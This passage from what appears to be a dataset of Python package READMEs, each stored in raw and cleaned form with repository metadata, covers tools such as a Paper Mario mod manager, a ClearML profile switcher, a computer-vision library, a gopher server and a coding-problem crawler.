$ touch papermario/src/my-mod.c && git -C papermario add src/my-mod.c && git -C papermario commit -m ""add src/my-mod.c""
$ merlon build
$ merlon export
$ merlon apply ""My mod 0.1.0.merlon""
```

Example mods can be found at [nanaian/pm-mods](https://github.com/nanaian/pm-mods).

## Mod file format

Merlon mods are packaged as `.merlon` files. These files are encrypted using the original game ROM, and cannot be used without the original game ROM. Unencrypted, it is a BZ2-compressed tarball of git patch files that can be applied to a copy of the decomp source code. Additionally, `.merlon` files contain only source code *changes*, so they are much smaller than the original game ROM. This means that you can use git to view the history of a mod, and to merge mods together. It also means that all mods distributed as `.merlon` files are source-available. This is in contrast to other patch formats, such as Star Rod's `.mod`, which distribute mods as binary patches that cannot be viewed or merged.

## Legal

This application is licensed under the Mozilla Public License 2.0. See the [LICENSE](LICENSE) file for details.

Mods created with this application are not covered by this license. Mods packaged into a file with this application are encrypted using the original game ROM, and cannot be used without the original game ROM. No guarantees are made about the legality of using this application to create mods.

The authors are not affiliated with Nintendo Co., Ltd. in any way.

The PAPER MARIO trademark owned by Nintendo Co., Ltd. is used in this modding tool under the fair use doctrine, solely for the purpose of enabling users to modify the game in a transformative manner.

","# Merlon

[![](https://img.shields.io/github/actions/workflow/status/nanaian/merlon/test.yml?branch=main)](https://github.com/nanaian/merlon/actions)
[![](https://img.shields.io/discord/279322074412089344?color=%237289DA&logo=discord&logoColor=ffffff)](https://discord.gg/paper-mario-modding-279322074412089344)
[![](https://img.shields.io/crates/v/merlon)](https://crates.io/crates/merlon)
[![](https://img.shields.io/pypi/v/merlon)](https://pypi.org/project/merlon/)

Merlon is a mod package manager for the Paper Mario (N64) decompilation.

Features:

- [x] Create packages (`merlon new`)
- [x] Export package to a file for distribution (`merlon export`)
- [x] Apply distributable files to a base ROM (`merlon apply`)
- [x] Compile current package to a modded ROM (`merlon build`)
- [x] Run modded ROM in an emulator (`merlon run`)
- [x] Package dependency management (`merlon add`)
- [x] Experimental GUI support (`merlon gui` when built with `--features gui`)
- [x] Experimental Python API (`pip install merlon`)

## Installation

> **Note:** If you use Windows, you will need to use WSL 2. See the [decomp installation instructions](https://github.com/pmret/papermario/blob/main/INSTALL.md#wsl-2) for more information.

See [releases](https://github.com/nanaian/merlon/releases) for pre-built binaries.

### From source

Merlon is written in Rust. To build from source, you will need to install the Rust toolchain. See [rustup.rs](https://rustup.rs/) for instructions.

Once you have the Rust toolchain installed, you can install Merlon from crates.io with:

```bash
cargo install merlon
```

If you have a clone of this repository, you can install Merlon with:

```bash
cargo install --path .
```

## Supported platforms

Merlon supports all platforms that the Paper Mario decompilation supports.

- Linux
    - Debian/Ubuntu
    - Arch Linux
    - openSUSE
    - Alpine Linux
    - Nix (nix-shell)
- macOS
- Windows (Windows Subsystem for Linux 2)

See the [decomp installation instructions](https://github.com/pmret/papermario/blob/main/INSTALL.md) for more information.

Additionally, Merlon has a number of runtime dependencies that should be available on your PATH:

- `git`
- `ninja`
- `python3`
- `tar`
- `bzip2`
- `openssl`

## Usage

Merlon is a command-line tool. Use `merlon help` for more information.

A quick tour:

```
$ merlon new ""My mod""
$ cd my-mod
$ merlon init
$ touch papermario/src/my-mod.c && git -C papermario add src/my-mod.c && git -C papermario commit -m ""add src/my-mod.c""
$ merlon build
$ merlon export
$ merlon apply ""My mod 0.1.0.merlon""
```

Example mods can be found at [nanaian/pm-mods](https://github.com/nanaian/pm-mods).

## Mod file format

Merlon mods are packaged as `.merlon` files. These files are encrypted using the original game ROM, and cannot be used without the original game ROM. Unencrypted, it is a BZ2-compressed tarball of git patch files that can be applied to a copy of the decomp source code. Additionally, `.merlon` files contain only source code *changes*, so they are much smaller than the original game ROM. This means that you can use git to view the history of a mod, and to merge mods together. It also means that all mods distributed as `.merlon` files are source-available. This is in contrast to other patch formats, such as Star Rod's `.mod`, which distribute mods as binary patches that cannot be viewed or merged.

## Legal

This application is licensed under the Mozilla Public License 2.0. See the [LICENSE](LICENSE) file for details.

Mods created with this application are not covered by this license. Mods packaged into a file with this application are encrypted using the original game ROM, and cannot be used without the original game ROM. No guarantees are made about the legality of using this application to create mods.

The authors are not affiliated with Nintendo Co., Ltd. in any way.

The PAPER MARIO trademark owned by Nintendo Co., Ltd. is used in this modding tool under the fair use doctrine, solely for the purpose of enabling users to modify the game in a transformative manner.

",nanaian/merlon
clenv,https://github.com/DavidSonoda/clenv,4,1941,1860,"# clenv - Clearml environment profile manager



## Pre-requisites

- `clearml` installed, please refer to [ClearML installation guide](https://clear.ml/docs/latest/docs/getting_started/ds/ds_first_steps) for more details.
- Run `clearml-init` and initialize your first ever config file.



## Installation

```bash
pip install clenv
```



## Usage

### Subcommand `config`
Note: All config files must be in the format of `clearml-<profile_name>.conf`

#### List all config profiles
```bash
clenv config list
```

#### Create a new config profile
```bash
clenv config create <profile_name>
```

#### Delete a config profile
```bash
clenv config del <profile_name>
```

#### Switch to a config profile
```bash
clenv config checkout <profile_name>
```

#### Reinitialize the `api` section of a config
```bash
clenv config reinit <profile_name>
# Please paste your multi-line configuration and press Enter:
```
Then paste your multi-line configuration generated through clearML server.

### Subcommand `user`

#### Generate user/password hocon config
```bash
clenv user genpass <user_name>
```



## Examples

### Create a new clearml config profile for privately hosted clearml server 

#### Initialize profiles

```bash
$ ./clearenvoy.bin config list
# Input a name for your current profile
```

#### Create a new profile

```bash
$ ./clearenvoy.bin config create brainco
```

#### Reinit the profile credentials

```bash
$ ./clearenvoy.bin config reinit brainco
```

#### Checkout the new profile

```bash
$ ./clearenvoy.bin config checkout brainco
```

## Roadmap
- [x] Config profile management
- [x] BCrypt password generation
- [ ] Support custom config file path
- [ ] Server side utils and config management
- [ ] ClearML Agent side utils and config management

## Disclaimer & License
This project is not affiliated with Allegro AI, Inc. in any way. It is an independent and unofficial software. It's licensed under the MIT license.
","# clenv - Clearml environment profile manager



## Pre-requisites

- `clearml` installed, please refer to [ClearML installation guide](https://clear.ml/docs/latest/docs/getting_started/ds/ds_first_steps) for more details.
- Run `clearml-init` and initialize your first ever config file.



## Installation

```bash
pip install clenv
```



## Usage

### Subcommand `config`
Note: All config files must be in the format of `clearml-.conf`

#### List all config profiles
```bash
clenv config list
```

#### Create a new config profile
```bash
clenv config create 
```

#### Delete a config profile
```bash
clenv config del 
```

#### Switch to a config profile
```bash
clenv config checkout 
```

#### Reinitialize the `api` section of a config
```bash
clenv config reinit 
# Please paste your multi-line configuration and press Enter:
```
Then paste your multi-line configuration generated through clearML server.

### Subcommand `user`

#### Generate user/password hocon config
```bash
clenv user genpass 
```



## Examples

### Create a new clearml config profile for privately hosted clearml server 

#### Initialize profiles

```bash
$ ./clearenvoy.bin config list
# Input a name for your current profile
```

#### Create a new profile

```bash
$ ./clearenvoy.bin config create brainco
```

#### Reinit the profile credentials

```bash
$ ./clearenvoy.bin config reinit brainco
```

#### Checkout the new profile

```bash
$ ./clearenvoy.bin config checkout brainco
```

## Roadmap
- [x] Config profile management
- [x] BCrypt password generation
- [ ] Support custom config file path
- [ ] Server side utils and config management
- [ ] ClearML Agent side utils and config management

## Disclaimer & License
This project is not affiliated with Allegro AI, Inc. in any way. It is an independent and unofficial software. It's licensed under the MIT license.
",davidsonoda/clenv
aisee,https://github.com/iiconocimiento/aisee,8,3768,3768,"[![AISee Logo](./docs/source/_resources/aisee-logo.png)](https://iiconocimiento.github.io/aisee/stable/)

---

[![License: MIT](https://img.shields.io/github/license/iiconocimiento/aisee)](https://github.com/iiconocimiento/aisee/blob/main/LICENSE) ![GitHub Stars](https://img.shields.io/github/stars/iiconocimiento/aisee?style=social) [![Latest Version on Pypi](https://img.shields.io/pypi/v/aisee)](https://pypi.org/project/aisee/) ![Supported Python versions](https://img.shields.io/pypi/pyversions/aisee) [![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black) ![Unit tests](https://github.com/iiconocimiento/aisee/actions/workflows/unit-tests.yml/badge.svg) ![Docs](https://github.com/iiconocimiento/aisee/actions/workflows/documentation.yml/badge.svg)

An open-source library for computer vision built on top of PyTorch and Timm libraries. It provides an easy-to-use interface for training and predicting with State-of-the-Art neural networks.

## AISee key features 

- 🤗 Simple interface for training and predicting using timm library models.
- 📁 Easily load images from a folder, a pandas `DataFrame` or a single image path.
- 🏋🏽‍♂️ Train SOTA neural networks from pre-trained weights or from scratch in very few lines of code.  
- 🖼️ Supports multiclass and multilabel image classification tasks.
- 🔨 We take care of `DataLoaders`, image transformations and training and inference loops.


## Quick tour

Here's an example of how to quickly train a model using AISee. We just have to initialize a `VisionClassifier` model and create a `Trainer`. As easy as it gets!

```python
from aisee import Trainer, VisionClassifier

# Initialize a VisionClassifier model
model = VisionClassifier(
    model_name=""vgg11_bn"", 
    num_classes=4,
)

# Create a Trainer 
trainer = Trainer(
    base_model=model, 
    data=f""animals/"",
    output_dir=""trained_weights.pt"",
)

# Train
trainer.train()
```

To predict call `predict` method, we take care of the rest:

```python
# Predict 
trainer.base_model.predict(""animals/without_label"")
```


## Installation

Install AISee using pip.

```bash
pip install aisee
```

## Getting started

- Visit [AISee Getting started](https://iiconocimiento.github.io/aisee/stable/_getting_started/getting_started.html) to get an overview of how AISee works.

- Explore [AISee Documentation](https://iiconocimiento.github.io/aisee/stable/) page for a detailed guide and comprehensive API reference.

- Check out [AISee Examples](https://iiconocimiento.github.io/aisee/stable/_examples/examples.html) for Jupyter Notebook examples and tutorials, showcasing how to use AISee effectively in various scenarios.

## Contributing

We value community contributions, and we encourage you to get involved in the continuous development of AISee. Please refer to [AISee Development](https://iiconocimiento.github.io/aisee/stable/_development/development.html) page for guidelines on how to contribute effectively.

We also appreciate your feedback which helps us develop a robust and efficient solution for computer vision tasks. Together, let's make AISee the go-to library for AI practitioners and enthusiasts alike.

## Contact Us
For any questions or inquiries regarding the AISee library or potential collaborations, please feel free to contact us in marketing@iic.uam.es. 

## Instituto de Ingeniería del Conocimiento (IIC)
IIC is a non-profit R&D centre founded in 1989 that has been working on Big Data analysis and Artificial Intelligence for more than 30 years. Its value proposition is the development of algorithms and analytical solutions based on applied research tailored to different businesses in different sectors such as energy, health, insurance and talent analytics.

---
","[![AISee Logo](./docs/source/_resources/aisee-logo.png)](https://iiconocimiento.github.io/aisee/stable/)

---

[![License: MIT](https://img.shields.io/github/license/iiconocimiento/aisee)](https://github.com/iiconocimiento/aisee/blob/main/LICENSE) ![GitHub Stars](https://img.shields.io/github/stars/iiconocimiento/aisee?style=social) [![Latest Version on Pypi](https://img.shields.io/pypi/v/aisee)](https://pypi.org/project/aisee/) ![Supported Python versions](https://img.shields.io/pypi/pyversions/aisee) [![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black) ![Unit tests](https://github.com/iiconocimiento/aisee/actions/workflows/unit-tests.yml/badge.svg) ![Docs](https://github.com/iiconocimiento/aisee/actions/workflows/documentation.yml/badge.svg)

An open-source library for computer vision built on top of PyTorch and Timm libraries. It provides an easy-to-use interface for training and predicting with State-of-the-Art neural networks.

## AISee key features 

- 🤗 Simple interface for training and predicting using timm library models.
- 📁 Easily load images from a folder, a pandas `DataFrame` or a single image path.
- 🏋🏽‍♂️ Train SOTA neural networks from pre-trained weights or from scratch in very few lines of code.  
- 🖼️ Supports multiclass and multilabel image classification tasks.
- 🔨 We take care of `DataLoaders`, image transformations and training and inference loops.


## Quick tour

Here's an example of how to quickly train a model using AISee. We just have to initialize a `VisionClassifier` model and create a `Trainer`. As easy as it gets!

```python
from aisee import Trainer, VisionClassifier

# Initialize a VisionClassifier model
model = VisionClassifier(
    model_name=""vgg11_bn"", 
    num_classes=4,
)

# Create a Trainer 
trainer = Trainer(
    base_model=model, 
    data=f""animals/"",
    output_dir=""trained_weights.pt"",
)

# Train
trainer.train()
```

To predict call `predict` method, we take care of the rest:

```python
# Predict 
trainer.base_model.predict(""animals/without_label"")
```


## Installation

Install AISee using pip.

```bash
pip install aisee
```

## Getting started

- Visit [AISee Getting started](https://iiconocimiento.github.io/aisee/stable/_getting_started/getting_started.html) to get an overview of how AISee works.

- Explore [AISee Documentation](https://iiconocimiento.github.io/aisee/stable/) page for a detailed guide and comprehensive API reference.

- Check out [AISee Examples](https://iiconocimiento.github.io/aisee/stable/_examples/examples.html) for Jupyter Notebook examples and tutorials, showcasing how to use AISee effectively in various scenarios.

## Contributing

We value community contributions, and we encourage you to get involved in the continuous development of AISee. Please refer to [AISee Development](https://iiconocimiento.github.io/aisee/stable/_development/development.html) page for guidelines on how to contribute effectively.

We also appreciate your feedback which helps us develop a robust and efficient solution for computer vision tasks. Together, let's make AISee the go-to library for AI practitioners and enthusiasts alike.

## Contact Us
For any questions or inquiries regarding the AISee library or potential collaborations, please feel free to contact us in marketing@iic.uam.es. 

## Instituto de Ingeniería del Conocimiento (IIC)
IIC is a non-profit R&D centre founded in 1989 that has been working on Big Data analysis and Artificial Intelligence for more than 30 years. Its value proposition is the development of algorithms and analytical solutions based on applied research tailored to different businesses in different sectors such as energy, health, insurance and talent analytics.

---
",iiconocimiento/aisee
gbs,https://github.com/gopherball/gbs,3,2970,2970,"![gb logo, a gopher in a ball](https://src.tty.cat/supakeen/gb/raw/branch/master/doc/_static/logo-doc.png)

# gbs

![rtd badge](https://readthedocs.org/projects/gb/badge/?version=latest) ![license badge](https://gb.readthedocs.io/en/latest/_static/license.svg) ![black badge](https://img.shields.io/badge/code%20style-black-000000.svg)

<<<<<<< Updated upstream
## About

`gb` or gopherball is a gopher server written in Python with the main goals of
ease of use and integration. The name gopherball is inspired by a recurring
theme in the Calvin & Hobbes comicbooks and a tongue in cheek reference of an
alternative to the World Wide Web as we know it today.
=======
A gopher server implemented on top of the [gb](https://github.com/supakeen/gb)-library.
>>>>>>> Stashed changes

## Examples
Quick examples to get you running.

<<<<<<< Updated upstream
`gb --mode=implicit .` will start a gopher server on `127.0.0.1` port `7070` serving
a recursive index of files starting from the current directory.

`gb --mode=implicit --magic .` will start `gb` in magic-mode on `127.0.0.1` port
`7070`. Magic mode will make `gb` guess at filetypes.

`gb --mode=implicit --host=""127.1.1.1"" --port 1025 .` will start `gb` in implicit
=======
`gbs --mode=implicit .` will start a gopher server on `127.0.0.1` port `7070` serving
a recursive index of files starting from the current directory.

`gbs --mode=implicit --magic .` will start `gbs` in magic-mode on `127.0.0.1` port
`7070`. Magic mode will make `gbs` guess at filetypes.

`gbs --mode=implicit --host=""127.1.1.1"" --port 1025 .` will start `gbs` in implicit
>>>>>>> Stashed changes
mode on the chosen ip and port. Note that using ports under 1024 requires
superuser permissions!

## Modes
`gbs` has one main mode of operation that is commonly used. More modes are
planned for the future.

### implicit
Implicit mode serves a directory recursively. Indexes are automatically
generated and text files are served to the client. Data files are also
supported.

## Magic
`gbs` will serve all non-directories as type 9 files, these are non-readable
files and most clients will prompt for download. Turning on magic with
`--magic` will let `gbs` try to determine the correct filetypes.

## Modes
`gb` has one main mode of operation that is commonly used. More modes are
planned for the future.

### implicit
Implicit mode serves a directory recursively. Indexes are automatically
generated and text files are served to the client. Data files are also
supported.

## Magic
`gb` will serve all non-directories as type 9 files, these are non-readable
files and most clients will prompt for download. Turning on magic with
`--magic` will let `gb` try to determine the correct filetypes.

## Contributing
The source code for `gb` lives on my Gitea where you can also submit issues and
pull requests. It mostly needs help by people with the ability to test in
various clients and libraries that might still support the gopher protocol.

","![gb logo, a gopher in a ball](https://src.tty.cat/supakeen/gb/raw/branch/master/doc/_static/logo-doc.png)

# gbs

![rtd badge](https://readthedocs.org/projects/gb/badge/?version=latest) ![license badge](https://gb.readthedocs.io/en/latest/_static/license.svg) ![black badge](https://img.shields.io/badge/code%20style-black-000000.svg)

<<<<<<< Updated upstream
## About

`gb` or gopherball is a gopher server written in Python with the main goals of
ease of use and integration. The name gopherball is inspired by a recurring
theme in the Calvin & Hobbes comicbooks and a tongue in cheek reference of an
alternative to the World Wide Web as we know it today.
=======
A gopher server implemented on top of the [gb](https://github.com/supakeen/gb)-library.
>>>>>>> Stashed changes

## Examples
Quick examples to get you running.

<<<<<<< Updated upstream
`gb --mode=implicit .` will start a gopher server on `127.0.0.1` port `7070` serving
a recursive index of files starting from the current directory.

`gb --mode=implicit --magic .` will start `gb` in magic-mode on `127.0.0.1` port
`7070`. Magic mode will make `gb` guess at filetypes.

`gb --mode=implicit --host=""127.1.1.1"" --port 1025 .` will start `gb` in implicit
=======
`gbs --mode=implicit .` will start a gopher server on `127.0.0.1` port `7070` serving
a recursive index of files starting from the current directory.

`gbs --mode=implicit --magic .` will start `gbs` in magic-mode on `127.0.0.1` port
`7070`. Magic mode will make `gbs` guess at filetypes.

`gbs --mode=implicit --host=""127.1.1.1"" --port 1025 .` will start `gbs` in implicit
>>>>>>> Stashed changes
mode on the chosen ip and port. Note that using ports under 1024 requires
superuser permissions!

## Modes
`gbs` has one main mode of operation that is commonly used. More modes are
planned for the future.

### implicit
Implicit mode serves a directory recursively. Indexes are automatically
generated and text files are served to the client. Data files are also
supported.

## Magic
`gbs` will serve all non-directories as type 9 files, these are non-readable
files and most clients will prompt for download. Turning on magic with
`--magic` will let `gbs` try to determine the correct filetypes.

## Modes
`gb` has one main mode of operation that is commonly used. More modes are
planned for the future.

### implicit
Implicit mode serves a directory recursively. Indexes are automatically
generated and text files are served to the client. Data files are also
supported.

## Magic
`gb` will serve all non-directories as type 9 files, these are non-readable
files and most clients will prompt for download. Turning on magic with
`--magic` will let `gb` try to determine the correct filetypes.

## Contributing
The source code for `gb` lives on my Gitea where you can also submit issues and
pull requests. It mostly needs help by people with the ability to test in
various clients and libraries that might still support the gopher protocol.

",gopherball/gbs
multiversx-sdk-transaction-decoder,https://github.com/multiversx/mx-sdk-py-transaction-decoder,1,774,774,"# Transaction decoder for Python

## Virtual Environment
```
python3 -m venv ./venv
source ./venv/bin/activate
pip install -r ./requirements.txt --upgrade
pip install -r ./requirements-dev.txt --upgrade
```

## Usage
```python
tx = TransactionToDecode()
tx.sender = ""erd18w6yj09l9jwlpj5cjqq9eccfgulkympv7d4rj6vq4u49j8fpwzwsvx7e85""
tx.receiver = ""erd18w6yj09l9jwlpj5cjqq9eccfgulkympv7d4rj6vq4u49j8fpwzwsvx7e85""
tx.value = ""0""
tx.data = ""RVNEVE5GVFRyYW5zZmVyQDRjNGI0ZDQ1NTgyZDYxNjE2MjM5MzEzMEAyZmI0ZTlAZTQwZjE2OTk3MTY1NWU2YmIwNGNAMDAwMDAwMDAwMDAwMDAwMDA1MDBkZjNiZWJlMWFmYTEwYzQwOTI1ZTgzM2MxNGE0NjBlMTBhODQ5ZjUwYTQ2OEA3Mzc3NjE3MDVmNmM2YjZkNjU3ODVmNzQ2ZjVmNjU2NzZjNjRAMGIzNzdmMjYxYzNjNzE5MUA=""

decoder = TransactionDecoder()
metadata = decoder.get_transaction_metadata(tx)
```
","# Transaction decoder for Python

## Virtual Environment
```
python3 -m venv ./venv
source ./venv/bin/activate
pip install -r ./requirements.txt --upgrade
pip install -r ./requirements-dev.txt --upgrade
```

## Usage
```python
tx = TransactionToDecode()
tx.sender = ""erd18w6yj09l9jwlpj5cjqq9eccfgulkympv7d4rj6vq4u49j8fpwzwsvx7e85""
tx.receiver = ""erd18w6yj09l9jwlpj5cjqq9eccfgulkympv7d4rj6vq4u49j8fpwzwsvx7e85""
tx.value = ""0""
tx.data = ""RVNEVE5GVFRyYW5zZmVyQDRjNGI0ZDQ1NTgyZDYxNjE2MjM5MzEzMEAyZmI0ZTlAZTQwZjE2OTk3MTY1NWU2YmIwNGNAMDAwMDAwMDAwMDAwMDAwMDA1MDBkZjNiZWJlMWFmYTEwYzQwOTI1ZTgzM2MxNGE0NjBlMTBhODQ5ZjUwYTQ2OEA3Mzc3NjE3MDVmNmM2YjZkNjU3ODVmNzQ2ZjVmNjU2NzZjNjRAMGIzNzdmMjYxYzNjNzE5MUA=""

decoder = TransactionDecoder()
metadata = decoder.get_transaction_metadata(tx)
```
",multiversx/mx-sdk-py-transaction-decoder
odoo14-addon-website-sale-filter-product-brand,https://github.com/OCA/e-commerce,2,2953,2574,"=================================
Website Sale Filter Product Brand
=================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fe--commerce-lightgray.png?logo=github
    :target: https://github.com/OCA/e-commerce/tree/14.0/website_sale_filter_product_brand
    :alt: OCA/e-commerce
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/e-commerce-14-0/e-commerce-14-0-website_sale_filter_product_brand
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/113/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This is module extends ""website_sale_product_brand"" to add brands as a filter on shop sidebar.

**Table of contents**

.. contents::
   :local:

Usage
=====

#. Go to Website Shop.
#. Select 'Customize' menu
#. Enable 'Product Attribute's Filters'
#. Enable 'Brands Filter'

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/e-commerce/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/e-commerce/issues/new?body=module:%20website_sale_filter_product_brand%0Aversion:%2014.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Advitus MB
* Ooops
* Cetmix

Contributors
~~~~~~~~~~~~

* Cetmix <https://cetmix.com>
* Dessan Hemrayev <dessanhemrayev@gmail.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/e-commerce <https://github.com/OCA/e-commerce/tree/14.0/website_sale_filter_product_brand>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","=================================
Website Sale Filter Product Brand
=================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fe--commerce-lightgray.png?logo=github
    :target: https://github.com/OCA/e-commerce/tree/14.0/website_sale_filter_product_brand
    :alt: OCA/e-commerce
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/e-commerce-14-0/e-commerce-14-0-website_sale_filter_product_brand
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/113/14.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This is module extends ""website_sale_product_brand"" to add brands as a filter on shop sidebar.

**Table of contents**

.. contents::
   :local:

Usage
=====

#. Go to Website Shop.
#. Select 'Customize' menu
#. Enable 'Product Attribute's Filters'
#. Enable 'Brands Filter'

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Advitus MB
* Ooops
* Cetmix

Contributors
~~~~~~~~~~~~

* Cetmix 
* Dessan Hemrayev 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/e-commerce `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/e-commerce
start-html-tag-helpers,https://github.com/justmars/start-html-tag-helpers,1,280,280,"# start-html-tag-helpers

![Github CI](https://github.com/justmars/start-html-tag-helpers/actions/workflows/main.yml/badge.svg)

## Development

See [documentation](https://justmars.github.io/start-html-tag-helpers).

1. Run `poetry install`
2. Run `poetry shell`
3. Run `pytest`
","# start-html-tag-helpers

![Github CI](https://github.com/justmars/start-html-tag-helpers/actions/workflows/main.yml/badge.svg)

## Development

See [documentation](https://justmars.github.io/start-html-tag-helpers).

1. Run `poetry install`
2. Run `poetry shell`
3. Run `pytest`
",justmars/start-html-tag-helpers
passlass498,https://github.com/TheCodingFreakj/password-manager,0,50,50,"A simple python wrapper for creating passwords

","A simple python wrapper for creating passwords

",thecodingfreakj/password-manager
pydhcp3,https://github.com/imgurbot12/pydhcp,0,249,249,"pydhcp
-------
Simple Python DHCP Library. DHCP Packet-Parsing/Client/Server

### Installation

```
pip install pydhcp3
```

### Examples

Examples can be found in the [examples](https://github.com/imgurbot12/pydhcp/tree/master/examples) directory.
","pydhcp
-------
Simple Python DHCP Library. DHCP Packet-Parsing/Client/Server

### Installation

```
pip install pydhcp3
```

### Examples

Examples can be found in the [examples](https://github.com/imgurbot12/pydhcp/tree/master/examples) directory.
",imgurbot12/pydhcp
hydrogibs,https://github.com/giboul/hydrogibs,0,37,37,"
# hydrogibs

Baby hydrology package
","
# hydrogibs

Baby hydrology package
",giboul/hydrogibs
psdelivery,https://github.com/team-angeline/psdelivery,4,3085,3011,"# 📦 psdelivery

[![Ubuntu](https://github.com/team-angeline/psdelivery/actions/workflows/test-ubuntu.yml/badge.svg)](https://github.com/team-angeline/psdelivery/actions/workflows/test-ubuntu.yml)
[![Windows](https://github.com/team-angeline/psdelivery/actions/workflows/test-windows.yml/badge.svg)](https://github.com/team-angeline/psdelivery/actions/workflows/test-windows.yml)
[![CI](https://github.com/team-angeline/psdelivery/actions/workflows/ci.yml/badge.svg)](https://github.com/team-angeline/psdelivery/actions/workflows/ci.yml)
![GitHub](https://img.shields.io/github/license/team-angeline/psdelivery)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/psdelivery?logo=python&logoColor=white)
[![PyPI](https://img.shields.io/pypi/v/psdelivery?label=pypi%20package&logo=pypi&logoColor=white)](https://pypi.org/project/psdelivery)
[![codecov](https://codecov.io/gh/team-angeline/psdelivery/branch/main/graph/badge.svg?token=LFC7Z4PGCT)](https://codecov.io/gh/team-angeline/psdelivery)

```shell
pip install psdelivery
```

## Introduction 
여러 코딩 사이트의 코딩 문제들을 크롤링하는 라이브러리 입니다. 초기 버전이라 기본 수준의 기능만 지원하지만. 차후 더 많은 기능들을 추가할 예정입니다. 왜냐면 재가 제 메인 프로젝트에 쓸 거니깐요.

## 🙋‍♂️ Functions

### Implemented
* 해당 사이트에서 코딩문제를 가져올 수 있습니다.
    * 백준 (solved.ac)
    * 리트코드 (leetcode)
* 파이썬 프로젝트에 모듈로 사용할 수 있고, CLI 환경에서도 바로 사용할 수 있습니다.
    * CLI 환경해서 명령어를 통해 실행할 경우, 결과 데이터는 JSON으로 저장됩니다.

### Will be Implemented
* 해당 사이트에도 코딩문제를 가져올 예정입니다.
    * 코드포스 (codeforces)
    * 해커랭크 (hackerrank)
* 여러 페이지 범위의 문제 리스트를 뽑아올 수 있습니다.
    * 해당 사이트의 모든 문제들도 하나의 명령어로 가져올 수 있습니다.
* 특정 문제에 대한 세부 정보를 가져올 수 있습니다.
    * 알고리즘 태그를 가져올 수 있습니다.

## ⭐ Required
* 반드시 크롬이 설치되어 있어야 합니다.
    * Debian계열의 경우, bin디렉토리에 크롬을 설치하는 Shell Script가 있습니다.
* 파이썬 버전은 반드시 ```3.10``` 이상이어야 합니다.

## 💽 How To Install For Developer
크롬과 파이썬이 설치되어있다는 가정 하에 설명합니다.

1. requirements.txt를 통해 패키지를 설치합니다.
2. 끗

## Usage
### As Command Line
✔️ **Version 확인하기**
```shell
python -m psdelivery version

# 0.1.0
```

📚 **문제 리스트 가져오기**
```
python -m psdelivery getlist -t <topic> -sp <page index> -o <output json file>
```
* **Options**
    * -t(--topic): 코딩 페이지 사이트를 명시합니다. 데이터를 가지고올 수 있는 사이트는 다음과 같습니다.
        * 백준: ```baekjoon``` 또는 ```solved.ac```
        * 리트코드: ```leetcode```
    * -sp(--single-page): 페이지 인덱스를 나타냅니다. 해당 옵션을 명시하지 않으면 1페이지의 문제 리스트를 가져옵니다.
    * -o(--output): 코딩문제 데이터를 저장할 파일 루트를 명시합니다.
* **example**
    ```
    python -m psdelivery getlist -t baekjoon -sp 3 -o output.json
    ```

### As Python Module

```python
from psdelivery import PsDelivery

""""""
PsDelivery 객체 생성
topic은 크롤링할 사이트 이름을 입력합니다.

백준: baekjoon 또는 solved.ac
리트코드: leetcode
""""""
